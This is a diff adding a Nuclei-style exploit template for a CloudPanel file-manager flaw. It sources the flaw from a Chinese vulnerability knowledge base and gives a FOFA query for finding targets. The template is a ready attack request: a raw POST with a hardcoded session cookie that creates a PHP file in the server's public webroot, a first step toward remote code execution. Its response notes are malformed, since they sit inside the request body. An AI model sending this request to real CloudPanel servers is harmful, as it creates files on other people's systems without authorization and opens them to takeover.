@@ -1,0 +1,51 @@
+id: poc-zn1snwp1yxkg9dyz
+info:
+  name: CloudPanel File-Manager REC
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zn1snwp1yxkg9dyz'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zn1snwp1yxkg9dyz
+    fofa: title="CloudPanel"
+http:
+- raw:
+  - 'POST /file-manager/backend/makefile HTTP/1.1
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Cookie: clp-fm=ZGVmNTAyMDA3ZDI0OGNjZmU0NTVkMGQ2NmJhMjUxYjdhYzg0NzcyYzBmNjM0ODg0ODY0OWYyZTQ0MjgwZDVjZDBjNmY3MWJiZWU4ZTM4OTU4ZmE4YjViNjE4MGJiZjQ4NzA3MzcwNTJiNzFhM2JjYTBmNTdiODQ4ZDZjYjhiNmY1N2U3YTM1YWY3YjA3MTM1ZTlkYjViMjY5OTkzM2Q3NTAyOWI0ZGQ5ZDZmOTFhYTVlZTRhZjg0ZTBmZTU5NjY4NGI4OGU0NjVkNDU4MWYxOTc2MGNiMGI0ZGY2MmZjM2RkMmI4N2RhMzJkYTU4NjNjMWFmMGZlOWIwZjcyZGRkNmFhYzk3ZGVlZmY=
+
+
+    Accept-Encoding: gzip, deflate
+
+
+
+
+    id=/htdocs/app/files/public/&name=dudesuite.php
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /dudesuite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
